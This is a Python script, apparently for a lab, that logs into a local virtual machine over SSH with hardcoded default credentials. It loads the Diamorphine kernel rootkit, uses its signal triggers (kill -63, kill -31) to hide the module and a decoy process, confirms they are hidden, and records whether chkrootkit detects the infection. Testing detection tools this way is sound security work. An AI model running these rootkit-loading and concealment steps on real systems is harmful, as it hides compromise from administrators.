import paramiko
import time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('192.168.46.131', username='osboxes', password='osboxes.org')

def run_cmd(cmd, desc=""):
    print(f"\n{'='*70}\n[CMD] {desc}: {cmd}\n{'='*70}")
    stdin, stdout, stderr = ssh.exec_command(cmd)
    out = stdout.read().decode()
    err = stderr.read().decode()
    rc = stdout.channel.recv_exit_status()
    print(f"EXIT CODE: {rc}")
    if out:
        print(f"STDOUT:\n{out}")
    if err:
        print(f"STDERR:\n{err}")
    return rc, out, err

transcript = []

def exec_and_record(cmd, desc=""):
    rc, out, err = run_cmd(cmd, desc)
    transcript.append({
        "desc": desc,
        "cmd": cmd,
        "rc": rc,
        "out": out,
        "err": err
    })
    return out

# Step 1: Check existing modules
exec_and_record("lsmod | grep diamorphine || echo 'Not loaded'", "Check Diamorphine initially")

# Step 2: Load Diamorphine
exec_and_record("echo osboxes.org | sudo -S insmod /home/osboxes/tools/Diamorphine/diamorphine.ko", "Load Diamorphine LKM")

# Step 3: Verify module loaded
exec_and_record("lsmod | grep diamorphine", "Verify Diamorphine in lsmod before hide")

# Step 4: Hide module via signal 63
exec_and_record("kill -63 0", "Trigger module hide (kill -63 0)")

# Step 5: Verify module hidden from lsmod
exec_and_record("lsmod | grep diamorphine || echo 'Diamorphine successfully hidden from lsmod'", "Verify Diamorphine hidden from lsmod")

# Step 6: Launch decoy sleeper process
out_decoy = exec_and_record("nohup sleep 99999 > /dev/null 2>&1 & echo $!", "Spawn decoy sleeper process")
decoy_pid = out_decoy.strip().splitlines()[-1].strip()
print(f"Decoy PID: {decoy_pid}")

# Step 7: Verify decoy PID is visible before hiding
exec_and_record(f"ps aux | grep '{decoy_pid}' | grep -v grep", "Verify decoy PID visible before hide")
exec_and_record(f"ls -ld /proc/{decoy_pid}", "Check /proc entry before hide")

# Step 8: Hide decoy PID via signal 31
exec_and_record(f"kill -31 {decoy_pid}", f"Hide decoy PID {decoy_pid} (kill -31 {decoy_pid})")

# Step 9: Verify decoy PID is hidden from userland
exec_and_record(f"ps aux | grep '{decoy_pid}' | grep -v grep || echo 'Decoy PID is hidden from ps aux'", "Verify decoy PID hidden from ps aux")
exec_and_record(f"ls -ld /proc/{decoy_pid} 2>&1 || true", "Verify /proc entry invisible to getdents64")

# Step 10: Run chkrootkit
print("\n>>> Executing chkrootkit (this may take ~30-60s) ...")
exec_and_record("echo osboxes.org | sudo -S /usr/sbin/chkrootkit", "Execute sudo chkrootkit on infected system")

ssh.close()

# Save transcript to file for documentation
import json
with open("chkrootkit_live_transcript.json", "w") as f:
    json.dump(transcript, f, indent=2)

print("\nAll steps completed successfully and saved to chkrootkit_live_transcript.json!")
